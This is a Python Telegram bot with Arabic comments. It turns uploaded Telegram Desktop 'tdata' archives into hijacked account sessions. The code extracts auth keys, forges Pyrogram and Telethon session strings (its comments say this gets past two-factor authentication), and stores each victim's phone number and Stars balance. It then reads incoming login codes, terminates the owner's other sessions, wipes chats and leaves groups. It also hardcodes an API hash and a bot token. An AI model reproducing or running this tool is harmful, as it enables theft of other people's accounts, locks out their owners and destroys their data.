import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging

# =========================================================
# 🚨 رادار الأخطاء (كاشف الأعطال الصامتة والمستقبلية) 🚨
# =========================================================

logging.basicConfig(
    level=logging.INFO, 
    format="%(asctime)s [%(levelname)s] %(message)s", 
    handlers=[logging.StreamHandler(sys.stdout)]
)

def radar_exception_handler(exctype, value, tb): 
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم اكتشاف انهيار مخفي في البوت!")
    logging.critical("السبب المباشر:")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

sys.excepthook = radar_exception_handler

# =========================================================
# 🛠️ ترقيعة بايثون (حل مشكلة الـ Event Loop)
# =========================================================

try: 
    asyncio.get_event_loop() 
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import telebot 
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton 
from pyrogram import Client 
from pyrogram.enums import ChatType 
from pyrogram.errors import FloodWait, AuthKeyUnregistered, SessionRevoked 
from telethon.sessions import StringSession 
from telethon.crypto import AuthKey

# المكتبة المتخصصة لفك تشفير TDATA
try: 
    from opentele.td import TDesktop 
    OPENTELE_AVAILABLE = True 
except ImportError: 
    OPENTELE_AVAILABLE = False 
    logging.warning("⚠️ مكتبة 'opentele' غير مثبتة! يرجى كتابة: pip install opentele") 
except BaseException as e:
    OPENTELE_AVAILABLE = False 
    logging.warning(f"⚠️ خطأ في تحميل مكتبة opentele: {e}")

# --- المتغيرات الأساسية ---
API_ID = 28797361
API_HASH = "771041b32e83ab232e066b7adeee700b"
BOT_TOKEN = "8960187108:AAFQcVcdZHa2OyjJgYZGtDb_MCU6VW-lsSY"

bot = telebot.TeleBot(BOT_TOKEN)

# =========================================================
# 🗄️ إدارة قواعد البيانات
# =========================================================

def get_db_conn(): 
    return sqlite3.connect('accounts.db', check_same_thread=False, timeout=20)

def init_db(): 
    conn = get_db_conn() 
    c = conn.cursor() 
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, stars INTEGER)''') 
    conn.commit() 
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars): 
    conn = get_db_conn() 
    c = conn.cursor() 
    c.execute("INSERT INTO sessions (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars))
    conn.commit() 
    conn.close()

def get_all_accounts(owner_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, stars FROM sessions WHERE owner_id=?", (owner_id,)) 
    rows = c.fetchall() 
    conn.close() 
    return rows

def get_account(acc_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id=?", (acc_id,)) 
    row = c.fetchone()
    conn.close() 
    return row

def delete_account(acc_id): 
    conn = get_db_conn() 
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,)) 
    conn.commit()
    conn.close()

init_db()

# --- دوال الأعلام والبلدان ---
COUNTRY_FLAGS = { "+964": ("🇮🇶", "العراق"), "+966": ("🇸🇦", "السعودية"), "+971": ("🇦🇪", "الإمارات"), "+965": ("🇰🇼", "الكويت"), "+974": ("🇶🇦", "قطر"), "+973": ("🇧🇭", "البحرين"), "+968": ("🇴🇲", "عُمان"), "+20": ("🇪🇬", "مصر"), "+212": ("🇲🇦", "المغرب"), "+213": ("🇩🇿", "الجزائر"), "+216": ("🇹🇳", "تونس"), "+218": ("🇱🇾", "ليبيا"), "+249": ("🇸🇩", "السودان"), "+967": ("🇾🇪", "اليمن"), "+962": ("🇯🇴", "الأردن"), "+961": ("🇱🇧", "لبنان"), "+963": ("🇸🇾", "سوريا") }

def get_country_info(phone): 
    if not phone: return "🏳️", "غير معروف" 
    for prefix, (flag, name) in COUNTRY_FLAGS.items(): 
        if phone.startswith(prefix): return flag, name 
    return "🏳️", "غير معروف"

# --- واجهات التحكم بالبوت ---
def home_keyboard(): 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("✉️ فحص الأكواد", callback_data="req_code"), InlineKeyboardButton("🕵️ كشف الحسابات", callback_data="reveal_accounts"))
    markup.row(InlineKeyboardButton("💀 إنهاء الجلسات الأخرى", callback_data="menu_terminate"), InlineKeyboardButton("🧹 التنظيف الشامل", callback_data="menu_clean")) 
    markup.row(InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="menu_logout")) 
    markup.row(InlineKeyboardButton("📂 إضافة حساب", callback_data="add_account")) 
    return markup

def accounts_action_keyboard(owner_id, action): 
    accounts = get_all_accounts(owner_id) 
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 الجميع", callback_data=f"act_{action}all"))
    for acc_id, phone, name, stars in accounts:
        markup.row(InlineKeyboardButton(f"{phone} | {name} | ⭐ {stars}", callback_data=f"act_{action}_{acc_id}")) 
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")) 
    return markup

# --- الأوامر والردود ---
@bot.message_handler(commands=['start']) 
def start_message(message):
    bot.reply_to( message, "🤖 أهلاً بك في بوت إدارة الحسابات الاحترافي!\n\n" "قم بإرسال ملف الـ TDATA (مضغوط بصيغة ZIP) وسيتم استخراج الحساب وفحصه فوراً.", reply_markup=home_keyboard(), parse_mode="Markdown" )

@bot.callback_query_handler(func=lambda call: call.data == "back_home") 
def back_home(call): 
    bot.edit_message_text("🤖 القائمة الرئيسية:", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "add_account") 
def add_account_prompt(call): 
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")) 
    bot.edit_message_text( "📤 إرسال ملف الـ TDATA المضغوط!\n\n" "أرسل ملف الـ ZIP المحتوي على الـ TDATA الآن وسيتم صيده تلقائياً.", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown" )

@bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
def reveal_accounts(call): 
    accounts = get_all_accounts(call.from_user.id) 
    if not accounts: 
        return bot.answer_callback_query(call.id, "لا توجد حسابات!", show_alert=True) 
    text = "🕵️ الحسابات المسجلة لديك:\n\n" 
    for acc_id, phone, name, stars in accounts: 
        text += f"👤 الاسم: {name} | 📱 {phone} | ⭐ {stars}\n" 
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")) 
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

# =========================================================
# 🔄 محرك فحص الأكواد الذكي
# =========================================================

@bot.callback_query_handler(func=lambda call: call.data == "req_code") 
def scan_all_codes(call): 
    bot.answer_callback_query(call.id, "⏳ جاري فحص جميع الحسابات...") 
    status_msg = bot.send_message(call.message.chat.id, "⏳ جاري فحص جميع الحسابات المضافة للبحث عن أكواد الدخول...", parse_mode="Markdown")
    asyncio.run(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def fetch_all_codes_async(owner_id, chat_id, msg_id): 
    accounts = get_all_accounts(owner_id) 
    if not accounts: 
        bot.edit_message_text("❌ لا توجد حسابات مضافة للبحث فيها.", chat_id, msg_id, reply_markup=home_keyboard())
        return

    found_codes = []
    for acc in accounts:
        acc_id, phone, name, stars = acc
        target_acc = get_account(acc_id)
        if not target_acc: continue
        pyro_session = target_acc[5]

        exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await exec_client.connect()
            async for msg in exec_client.get_chat_history(777000, limit=3):
                if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                    match = re.search(r'\b(\d{5})\b', msg.text)
                    if match:
                        found_codes.append((phone, match.group(1)))
                        break  
        except: pass  
        finally:
            if exec_client.is_connected: await exec_client.disconnect()

    if found_codes:
        text = "**✅ تم العثور على أكواد الدخول التالية:**\n\n"
        for phone, code in found_codes:
            flag, country = get_country_info(phone)
            text += f"🌎 {flag} `{phone}` ➔ 🔑 **{code}**\n"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())
    else:
        bot.edit_message_text("❌ لم يتم العثور على أي أكواد في جميع الحسابات.", chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard())

# --- قوائم التنفيذ والإجراءات السريعة ---

@bot.callback_query_handler(func=lambda call: re.match(r"^menu_(terminate|clean|logout)$", call.data)) 
def action_menus(call):
    action = call.data.split("_")[1] 
    titles = { "terminate": "💀 إنهاء الجلسات الأخرى:\nاختر حساباً لحذف جميع جلساته:", "clean": "🧹 التنظيف الشامل:\nاختر حساباً لحذف جميع المحادثات والجروبات:", "logout": "🚪 تسجيل الخروج:\nاختر حساباً لتسجيل خروجه نهائياً:" } 
    bot.edit_message_text(titles[action], call.message.chat.id, call.message.message_id, reply_markup=accounts_action_keyboard(call.from_user.id, action), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: re.match(r"^act_(terminate|clean|logout)_(all|\d+)$", call.data)) 
def execute_action(call): 
    data = call.data.split("_") 
    action, target = data[1], data[2] 
    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ...")

    if target == "all":
        accounts = get_all_accounts(call.from_user.id)
        for acc in accounts: 
            asyncio.run(perform_action_async(action, acc[0], call.from_user.id))
        bot.edit_message_text(f"✅ **تم تنفيذ الإجراء على جميع الحسابات.**", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
    else:
        msg = asyncio.run(perform_action_async(action, int(target), call.from_user.id))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

async def perform_action_async(action, acc_id, owner_id): 
    acc = get_account(acc_id) 
    if not acc: return "❌ الحساب غير موجود." 
    _, _, phone, user_id, first_name, pyro_session, _, _, _ = acc

    try:
        exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        await exec_client.connect()
    except (AuthKeyUnregistered, SessionRevoked):
        delete_account(acc_id)
        return f"❌ الحساب `{phone}` محظور وتالف، تم حذفه تلقائياً."
    except: return f"❌ فشل الاتصال بـ `{phone}`."

    result_msg = ""
    try:
        if action == "terminate":
            auths = await exec_client.get_authorizations()
            for auth in auths:
                if not auth.is_current:
                    await exec_client.terminate_session(auth.hash)
                    await asyncio.sleep(1)
            result_msg = f"💀 **تم إنهاء الجلسات الأخرى لـ** `{phone}`."

        elif action == "clean":
            async for dialog in exec_client.get_dialogs():
                try:
                    if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                        await exec_client.leave_chat(dialog.chat.id)
                        await asyncio.sleep(0.5)
                    elif dialog.chat.type == ChatType.PRIVATE and not dialog.chat.is_verified:
                        await exec_client.delete_chat_history(dialog.chat.id)
                        await asyncio.sleep(0.5)
                except FloodWait as e: await asyncio.sleep(e.value)
                except: continue
            result_msg = f"🧹 **تم التنظيف الشامل لـ** `{phone}`."

        elif action == "logout":
            await exec_client.log_out()
            delete_account(acc_id)
            result_msg = f"🚪 **تم تسجيل الخروج وحذف البيانات لـ** `{phone}`."
    except Exception as e: result_msg = f"❌ خطأ: {type(e).__name__}"
    finally:
        if exec_client.is_connected: await exec_client.disconnect()
    return result_msg

# =========================================================
# ⚙️ محرك الـ TDATA الاحترافي الصافي (صياد الـ Auth Key)
# =========================================================

def get_dc_ip(dc_id): 
    ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"} 
    return ips.get(dc_id, "149.154.167.51")

# ✅ [تم حل المشكلة هنا]: تم التحديث لصيغة Pyrogram V2 بـ 271 بايت ليتخطى كل الأخطاء والـ 2FA
def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999): 
    # Pyrogram V2 Format (>BI?256sQ?) = 271 bytes exactly (DC, API_ID, Test, AuthKey, UserID, is_bot)
    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False) 
    pyro_session = base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("=")

    session = StringSession()
    session._dc_id = dc_id
    session._server_address = get_dc_ip(dc_id)
    session._port = 443  
    session._auth_key = AuthKey(auth_key_bytes)

    return pyro_session, session.save()

# دالة الاستخراج الاحترافية والوحيدة للـ TDATA
async def extract_tdata_official(base_dir): 
    if not OPENTELE_AVAILABLE: return None, None, None

    tdata_path = None
    # الغوص في المجلدات والبحث الشامل والمباشر عن ملف الـ key_datas
    for root, dirs, files in os.walk(base_dir):
        if 'key_datas' in files:
            tdata_path = root
            break
            
    if not tdata_path: return None, None, None

    try:
        tdesk = TDesktop(tdata_path)
        if not tdesk.isLoaded(): return None, None, None
            
        # خوارزمية الصياد لفحص كتل الذاكرة بحثاً عن الـ 256 بايت للمفتاح (تعمل كطوق نجاة)
        def hunt_key(obj, depth=0, visited=None):
            if visited is None: visited = set()
            if id(obj) in visited or depth > 5: return None
            visited.add(id(obj))
            
            if isinstance(obj, bytes) and len(obj) == 256: return obj
            if hasattr(obj, 'key') and isinstance(getattr(obj, 'key'), bytes) and len(getattr(obj, 'key')) == 256:
                return getattr(obj, 'key')
                
            if isinstance(obj, dict):
                for v in obj.values():
                    res = hunt_key(v, depth+1, visited)
                    if res: return res
            elif isinstance(obj, list):
                for v in obj:
                    res = hunt_key(v, depth+1, visited)
                    if res: return res
            elif hasattr(obj, '__dict__'):
                for k, v in vars(obj).items():
                    res = hunt_key(v, depth+1, visited)
                    if res: return res
            return None

        auth_key, dc_id, user_id = None, None, 9999
        
        # استخراج مباشر وأكثر مرونة
        if hasattr(tdesk, 'accounts') and tdesk.accounts:
            for acc in tdesk.accounts:
                user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))
                auth_key = hunt_key(acc)
                dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', None)))
                if not dc_id and hasattr(acc, 'api'):
                    dc_id = getattr(acc.api, 'dc_id', getattr(acc.api, 'MainDcId', None))
                if auth_key and dc_id: return int(dc_id), auth_key, user_id
                    
        if hasattr(tdesk, 'mainAccount'):
            acc = tdesk.mainAccount
            user_id = getattr(acc, 'UserId', getattr(acc, 'id', 9999))
            auth_key = hunt_key(acc)
            dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', None)))
            if not dc_id and hasattr(acc, 'api'):
                dc_id = getattr(acc.api, 'dc_id', getattr(acc.api, 'MainDcId', None))
            if auth_key: return int(dc_id or 2), auth_key, user_id

        return None, None, None
    except: return None, None, None

async def verify_and_save_async(owner_id, dc_id, auth_key, user_id, stype): 
    # إرسال مفتاح الـ API ليتوافق مع تحديث بايروجرام الأخير وتفادي جميع مشاكل الإتصال
    pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key, user_id) 
    client = Client(f"verify_{owner_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True) 
    
    await client.connect() 
    me = await client.get_me() 
    phone, first_name = me.phone_number or "Unknown", me.first_name or "User"

    try:
        from pyrogram.raw.functions.payments import GetStarsStatus
        res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
        stars = getattr(res, "balance", 0)
    except: stars = 0
        
    await client.disconnect()
    save_account(owner_id, phone, me.id, first_name, pyro_session, tl_session, stype, stars)
    return phone, first_name, stars

# =========================================================
# 📥 دالة استقبال الملفات الوحيدة والذكية
# =========================================================

@bot.message_handler(content_types=['document']) 
def handle_files(message):
    file_name = message.document.file_name 
    if not file_name.endswith(".zip"): return

    status_msg = bot.reply_to(message, "⏳ جاري فحص ملف الـ TDATA فحصاً عميقاً...")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    extract_dir = f"tmp_{message.from_user.id}_{message.message_id}"
    os.makedirs(extract_dir, exist_ok=True)
    local_path = os.path.join(extract_dir, file_name)

    with open(local_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    results = []
    try:
        with zipfile.ZipFile(local_path, 'r') as zip_ref: 
            zip_ref.extractall(extract_dir)
        
        # استدعاء الدالة الاحترافية للـ TDATA مباشرة
        dc_id, auth_key, user_id = asyncio.run(extract_tdata_official(extract_dir))
        
        if dc_id and auth_key:
            p, n, s = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, user_id, "TDATA Account"))
            results.append(f"✅ {p} ({n}) ⭐ {s}")

        if results:
            bot.edit_message_text("**تمت إضافة حساب الـ TDATA بنجاح:**\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
        else:
            bot.edit_message_text("❌ لم يتم العثور على ملفات TDATA صالحة داخل الـ ZIP. تأكد من وجود مجلد الـ TDATA السليم.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
    except Exception as e:
        bot.edit_message_text("❌ حدث خطأ أثناء معالجة الملف المضغوط.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
        logging.error(f"Error: {e}")
    finally:
        shutil.rmtree(extract_dir, ignore_errors=True)

# =========================================================
# 🚀 تشغيل البوت المباشر
# =========================================================

if __name__ == "__main__": 
    logging.info("🚀 جاري إطلاق البوت وتنظيف الجلسات القديمة...")
    try: 
        bot.remove_webhook() 
        time.sleep(1) 
    except: pass

    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=10, long_polling_timeout=5)
        except Exception as e:
            logging.error(f"⚠️ انقطع الاتصال: {e} .. إعادة التشغيل التلقائي بعد 3 ثواني")
            time.sleep(3)